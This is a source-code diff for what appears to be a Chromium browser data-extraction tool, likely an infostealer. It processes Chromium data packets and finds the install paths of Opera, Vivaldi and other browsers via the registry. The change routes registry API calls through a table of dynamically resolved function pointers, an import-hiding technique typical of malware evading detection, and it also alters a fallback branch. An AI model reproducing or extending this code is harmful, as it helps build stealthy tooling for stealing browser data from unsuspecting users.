@@ -3,6 +3,12 @@
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
+// Extern Global (Defined in 'Main.cpp')
+
+extern DINMCLY_RSOLVD_FUNCTIONS g_ResolvedFunctions;
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
 static BOOL ProcessDataPacket(IN PCHROMIUM_DATA pChromiumData, IN PBYTE pbData, IN DWORD cbData)
 {
     PDATA_PACKET    pPacket     = (PDATA_PACKET)pbData;
@@ -368,38 +374,37 @@ BOOL GetBrowserPath(IN BROWSER_TYPE Browser, IN OUT LPWSTR szBrowserPath, IN DWO
     // 2. For Opera and Vivaldi browsers, try HKEY_CURRENT_USER registry
     if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX || Browser == BROWSER_VIVALDI)
     {
-        if ((STATUS = RegOpenKeyExW(HKEY_CURRENT_USER, szRegKey, 0, KEY_READ, &hKey)) == ERROR_SUCCESS)
+        if ((STATUS = g_ResolvedFunctions.pRegOpenKeyExW(HKEY_CURRENT_USER, szRegKey, 0, KEY_READ, &hKey)) == ERROR_SUCCESS)
         {
-            if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) == ERROR_SUCCESS)
+            if ((STATUS = g_ResolvedFunctions.pRegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) == ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                g_ResolvedFunctions.pRegCloseKey(hKey);
 
                 if (GetFileAttributesW(szBrowserPath) != INVALID_FILE_ATTRIBUTES)
                     return TRUE;
             }
             else
             {
-                RegCloseKey(hKey);
+                g_ResolvedFunctions.pRegCloseKey(hKey);
             }
         }
-        return FALSE;
     }
 
     // 3. For other browsers, try HKEY_LOCAL_MACHINE registry
-    if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegKey, 0, KEY_READ, &hKey)) != ERROR_SUCCESS)
+    if ((STATUS = g_ResolvedFunctions.pRegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegKey, 0, KEY_READ, &hKey)) != ERROR_SUCCESS)
     {
         DBGA("[!] RegOpenKeyExW Failed With Error: %ld", STATUS);
         return FALSE;
     }
 
-    if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) != ERROR_SUCCESS)
+    if ((STATUS = g_ResolvedFunctions.pRegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) != ERROR_SUCCESS)
     {
         DBGA("[!] RegQueryValueExW Failed With Error: %ld", STATUS);
-        RegCloseKey(hKey);
+        g_ResolvedFunctions.pRegCloseKey(hKey);
         return FALSE;
     }
 
-    RegCloseKey(hKey);
+    g_ResolvedFunctions.pRegCloseKey(hKey);
 
     if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
     {
